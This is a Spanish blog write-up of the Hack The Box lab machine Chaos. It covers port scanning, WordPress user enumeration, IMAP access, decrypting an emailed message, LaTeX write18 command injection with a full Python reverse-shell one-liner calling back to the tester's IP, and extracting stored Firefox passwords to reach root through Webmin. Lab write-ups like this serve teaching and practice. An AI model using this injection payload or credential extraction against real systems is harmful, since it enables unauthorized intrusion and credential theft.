+++
date = "2019-05-27"
title = "Write-up HTB Chaos"
author = "Alejandro Fernández"
toc = false
+++

Buenas a todos,

Con esta entrada vamos a comenzar una nueva serie de posts en los cuales vamos a aprender a explotar máquinas vulnerables y a resolver retos de temática hacking.

En este caso vamos a comenzar con la última máquina retirada de [Hack The Box](https://www.hackthebox.eu/), **Chaos**.

[![/images/write-up-htb-chaos/write-up-htb-chaos_001.png](/images/write-up-htb-chaos/write-up-htb-chaos_001.png)](/images/write-up-htb-chaos/write-up-htb-chaos_001.png)

Para quién no conozca **HTB**, es un laboratorio de pentesting que proporciona diferentes máquinas y retos para sus usuarios.  Suelo recomendar este tipo de plataformas ya que nos permiten aprender diferentes tecnologías enfrentándonos a ellas.

El objetivo de estas entradas, además de aprender a explotar las máquinas, es enseñar y afianzar los conocimientos necesarios para la explotación de las mismas.

En este caso, la IP de nuestro objetivo es 10.10.10.120. En primer lugar, como por norma general en **HTB**, comenzaremos con un escaneo de puertos. Personalmente me gusta realizar el escaneo con los script por defecto de `nmap (-sC)`, para así aprovechar y además de obtener los puertos abiertos, descubrir si el objetivo tiene alguna vulnerabilidad a priori. Por tanto usé el siguiente comando:

```bash
nmap -sSV -sC 10.10.10.120
```

[![/images/write-up-htb-chaos/write-up-htb-chaos_002.png](/images/write-up-htb-chaos/write-up-htb-chaos_002.png)](/images/write-up-htb-chaos/write-up-htb-chaos_002.png)

Del resultado del escaneo podemos extraer que en la máquina corren dos servidores web en los puertos 80 y 10000, y que además tiene el propósito de ser un servidor de correo ya que tiene los servicios **imap** y **pop3** activos tanto en su versión normal como en su versión segura.

Tras analizar el escaneo, intentamos acceder al servidor que corre en el puerto 80, obteniendo el siguiente mensaje.

[![/images/write-up-htb-chaos/write-up-htb-chaos_003.png](/images/write-up-htb-chaos/write-up-htb-chaos_003.png)](/images/write-up-htb-chaos/write-up-htb-chaos_003.png)

Dejamos de lado el servidor del puerto 80, por el momento, y revisamos el servidor del puerto 10000 que en este caso se corresponde con un **Webmin**, pero para poder acceder a él necesitamos credenciales. Probamos los típicos credenciales por defecto pero no conseguimos entrar.

[![/images/write-up-htb-chaos/write-up-htb-chaos_004.png](/images/write-up-htb-chaos/write-up-htb-chaos_004.png)](/images/write-up-htb-chaos/write-up-htb-chaos_004.png)

Antes de comenzar a analizar el servidor de correo, realizamos la técnica de búsqueda de directorios conocida como «**fuzzing**» sobre el servidor del puerto 80. En este caso, he usado **dirb** con el diccionario que usa por defecto y con el parámetro -w para ignorar warnings y así listar directorios.

```bash
dirb http://10.10.10.120 -w
```

[![/images/write-up-htb-chaos/write-up-htb-chaos_005.png](/images/write-up-htb-chaos/write-up-htb-chaos_005.png)](/images/write-up-htb-chaos/write-up-htb-chaos_005.png)

Como podemos ver, este servidor contiene un **wordpress** en el recurso `/wp/wordpress`. Si accedemos al recurso podemos ver que el contenido está protegido con contraseña.

[![/images/write-up-htb-chaos/write-up-htb-chaos_006.png](/images/write-up-htb-chaos/write-up-htb-chaos_006.png)](/images/write-up-htb-chaos/write-up-htb-chaos_006.png)

A pesar de estar protegido, podemos intentar listar los usuarios existentes. Para ello vamos a recordar una [entrada antigua del blog](https://hackpuntes.com/enumerar-usuarios-y-realizar-ataques-de-fuerza-bruta-en-wordpress-con-burp-suite/) en la que aprendíamos a enumerar usuarios y a realizar ataques de fuerza bruta en **wordpress**.

Probando con el ID 1, solicitando al servidor el recurso `/wp/wordpress/?author=1` obtendremos que existe un usuario cuyo nombre es human.

[![/images/write-up-htb-chaos/write-up-htb-chaos_007.png](/images/write-up-htb-chaos/write-up-htb-chaos_007.png)](/images/write-up-htb-chaos/write-up-htb-chaos_007.png)

Si probamos este nombre de usuario como contraseña para acceder al contenido…**BINGO!**

[![/images/write-up-htb-chaos/write-up-htb-chaos_008.png](/images/write-up-htb-chaos/write-up-htb-chaos_008.png)](/images/write-up-htb-chaos/write-up-htb-chaos_008.png)

Probamos estas credenciales en el servidor **Webmin** pero no funcionan. Pero si estas credenciales no son para este servidor, ¿para qué sirven?¿son una pista falsa?

Como hemos visto en el escaneo inicial, la máquina tiene activos los servicios **imap** y **pop3**, los cuales habíamos dejado abandonados. Llegó el momento de revisarlos.

En mi caso, usé el servidor **imap** usando **telnet** para conectarme a él. El proceso de **login** en el servidor se realiza con el siguiente comando:

```bash
a login usuario password
```

[![/images/write-up-htb-chaos/write-up-htb-chaos_009.png](/images/write-up-htb-chaos/write-up-htb-chaos_009.png)](/images/write-up-htb-chaos/write-up-htb-chaos_009.png)

Como podemos ver, el servidor no permite el proceso de login a través de la versión insegura del servicio, por lo que probaremos en la versión segura de **imap**. Para ello usaremos **openSSL** empleando el siguiente comando:

```bash
openssl s_client -connect 10.10.10.120:993
```

Una vez que accedamos podremos ver que no existe ningún mensaje en la bandeja de entrada, pero si miramos bien podremos ver que existe un correo en borradores.

[![/images/write-up-htb-chaos/write-up-htb-chaos_010.png](/images/write-up-htb-chaos/write-up-htb-chaos_010.png)](/images/write-up-htb-chaos/write-up-htb-chaos_010.png)

Llegados a este punto y debido a que el correo tenía un archivo adjunto decidí comenzar a trabajar con un cliente de correo, para hacer más fácil la tarea. Haciendo uso de **claws-email** obtuve los adjuntos del correo. Estos eran un mensaje cifrado que contenía la contraseña y el script con el que se había cifrado dicho mensaje.

[![/images/write-up-htb-chaos/write-up-htb-chaos_011.png](/images/write-up-htb-chaos/write-up-htb-chaos_011.png)](/images/write-up-htb-chaos/write-up-htb-chaos_011.png)

El objetivo es claro, debemos programar la función de descifrado en base al proceso de cifrado que ya tenemos. Buscando en internet,  encontramos que ya existe un código que hace uso de la misma función de cifrado, dicho código contiene también la función de descifrado, por lo que no será necesario programarla. El código está accesible [aquí](https://github.com/bing0o/Python-Scripts/blob/master/crypto.py.).

Usando la función de descifrado cree un pequeño código partiendo del existente, para descifrar el mensaje. El código es el siguiente:

```python
import sys, os
from Crypto.Hash import SHA256
from Crypto import Random
from Crypto.Cipher import AES

def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
	    print(filesize.encode('utf-8'))
	    print(IV)
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))

def decrypt(key, filename):
	chunksize = 64 * 1024
	outputFile = "decrypt" + filename
	with open(filename, 'rb') as infile:
		filesize = int(infile.read(16))
		IV = infile.read(16)
		decryptor = AES.new(key, AES.MODE_CBC, IV)
		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break
				outfile.write(decryptor.decrypt(chunk))
			outfile.truncate(filesize)

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

decrypt(getKey(sys.argv[1]), sys.argv[2])
```

Al descifrar el fichero obtenemos:

```txt
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
```

El texto está en base64, si lo decodificamos obtendremos:

```txt
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Para acceder a este recurso debemos configurar el nombre de la máquina chaos.htb en el fichero /etc/hosts ya que sólo es accesible mediante nombre de dominio. Una vez dentro encontraremos una aplicación que genera un pdf con el texto que introduce el usuario, para ello hace uso de **Latex**.

[![/images/write-up-htb-chaos/write-up-htb-chaos_012.png](/images/write-up-htb-chaos/write-up-htb-chaos_012.png)](/images/write-up-htb-chaos/write-up-htb-chaos_012.png)

**Latex** es un sistema de composición de textos muy empleado en documentos técnicos, artículos científicos, papers, etc. La versión que usa la aplicación contiene diferentes características entre las que se incluye la ejecución de código, lo cual no es una buena idea. Haciendo uso de la sintaxis `\immediate\write18{comando}` podemos ejecutar cualquier comando. Por lo que podremos obtener una **shell** mediante el siguiente comando.

```bash
\immediate\write18{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.104",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'}
```

[![/images/write-up-htb-chaos/write-up-htb-chaos_013.gif](/images/write-up-htb-chaos/write-up-htb-chaos_013.gif)](/images/write-up-htb-chaos/write-up-htb-chaos_013.gif)

La shell que obtenemos corre con el usuario **www-data** y no nos permite ver el fichero user.txt, por lo que vamos a cambiar al usuario obtenido en el wordpress usando la misma contraseña. Ya como usuario ayush, podremos ver el fichero user.txt que contiene la flag. Para poder cambiar de usuario debemos upgradear la shell, yo utilizo python mediante el siguiente comando:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Además, /bin no está añadido en el path por lo que para ejecutar los binarios localizados en esa ruta, debemos incluir la ruta completa.

[![/images/write-up-htb-chaos/write-up-htb-chaos_014.png](/images/write-up-htb-chaos/write-up-htb-chaos_014.png)](/images/write-up-htb-chaos/write-up-htb-chaos_014.png)

Obtenida la flag de user, comenzamos la escalada de privilegios. Para empezar con esta fase siempre suelo emplear la herramienta [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration), ya que automatiza bastantes técnicas que suelo emplear en la escalada de privilegios: comprobar usuarios, permisos, tareas programadas, etc.

Una vez lanzada la herramienta no vi nada extraño, por lo que eché un vistazo en los directorios que tenía el usuario ayush. Uno de los directorios ocultos del usuario es .mozilla que contenía el directorio **firefox**, por lo que era posible que el usuario hubiera almacenada alguna contraseña en el navegador que pudiera ayudarnos.

[![/images/write-up-htb-chaos/write-up-htb-chaos_015.png](/images/write-up-htb-chaos/write-up-htb-chaos_015.png)](/images/write-up-htb-chaos/write-up-htb-chaos_015.png)

[Firefox Decrypt](https://github.com/unode/firefox_decrypt) es una herramienta que nos permite descifrar las contraseñas almacenadas en firefox, pero para ello es necesario proporcionarle la clave maestra. Probamos con la contraseña encontrada en el **wordpress** y… **BOOM!** Tenemos las credenciales para acceder al **Webadmin** que no habíamos podido acceder anteriormente.

**Webadmin** es una herramienta para la configuración y administración de sistemas vía Web. Accedemos usando los credenciales encontrados y podemos obtener una shell como root que nos permite visualizar el contenido de root.txt

[![/images/write-up-htb-chaos/write-up-htb-chaos_016.png](/images/write-up-htb-chaos/write-up-htb-chaos_016.png)](/images/write-up-htb-chaos/write-up-htb-chaos_016.png)

Bueno pues esto ha sido todo por hoy, nos vemos en la próxima!!

Un saludo!